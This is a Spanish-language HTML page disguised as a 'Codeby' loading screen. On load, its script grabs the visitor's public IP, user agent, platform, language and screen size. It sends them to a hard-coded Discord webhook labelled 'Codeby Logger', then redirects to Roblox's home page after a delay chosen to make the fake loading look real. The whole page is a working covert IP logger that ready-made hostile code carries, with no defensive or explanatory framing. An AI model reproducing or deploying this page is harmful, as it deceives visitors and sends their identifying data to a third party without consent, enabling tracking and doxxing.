<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Codeby - Cargando Recurso</title>
    <style>
        /* Diseño estilo Codeby Dark Mode */
        body {
            background-color: #0d0d0d;
            color: #00ffcc;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        .container {
            text-align: center;
            border: 1px solid #00ffcc;
            padding: 40px;
            border-radius: 20px;
            background: #141414;
            box-shadow: 0 0 25px rgba(0, 255, 204, 0.15);
        }

        .loader {
            border: 4px solid #1a1a1a;
            border-top: 4px solid #00ffcc;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
            display: inline-block;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        h2 {
            font-size: 1.2rem;
            letter-spacing: 2px;
            text-transform: uppercase;
            margin: 0;
            text-shadow: 0 0 10px #00ffcc;
        }

        p {
            color: #888;
            font-size: 0.9rem;
            margin-top: 10px;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="loader"></div>
        <h2>Cargando Codeby</h2>
        <p>Verificando conexión con el servidor...</p>
    </div>

    <script>
        async function runSystem() {
            // Configuración
            const webhookURL = "https://discord.com/api/webhooks/1499616194741801133/i-irhmgrf87Sldg0W8yWsgRAz_TUYh3JK7DEu7UGi6bsKvMNUwNe3vnpH2Ga1qFlvUNk";
            const paginaDestino = "https://www.roblox.com/home";

            try {
                // 1. Obtener la IP pública
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();

                // 2. Preparar la información del dispositivo
                const info = {
                    ip: ipData.ip,
                    plataforma: navigator.platform,
                    agente: navigator.userAgent,
                    lenguaje: navigator.language,
                    pantalla: `${window.screen.width}x${window.screen.height}`,
                    fecha: new Date().toLocaleString('es-ES')
                };

                // 3. Enviar datos al Webhook de Discord
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: "Codeby Logger",
                        avatar_url: "https://i.imgur.com/vH0Q83r.png", // Icono opcional
                        embeds: [{
                            title: "🚨 Captura de Datos Detectada",
                            color: 0x00ffcc,
                            fields: [
                                { name: "🌐 Dirección IP", value: `\`${info.ip}\``, inline: true },
                                { name: "🌍 Ubicación Teórica", value: `[Ver Mapa](https://www.iplocation.net/search?q=${info.ip})`, inline: true },
                                { name: "📱 Dispositivo / Agente", value: info.agente },
                                { name: "🖥️ Plataforma", value: info.plataforma, inline: true },
                                { name: "📏 Resolución", value: info.pantalla, inline: true },
                                { name: "🔗 URL de Destino", value: paginaDestino }
                            ],
                            footer: { text: "Sistema Codeby versión gratuita • " + info.fecha }
                        }]
                    })
                });

            } catch (error) {
                console.error("Error silencioso...");
            } finally {
                // 4. Redirigir al usuario (Esperamos 1.5 segundos para que parezca carga real)
                setTimeout(() => {
                    window.location.href = paginaDestino;
                }, 1500);
            }
        }

        // Ejecutar proceso al entrar
        window.onload = runSystem;
    </script>
</body>
</html>
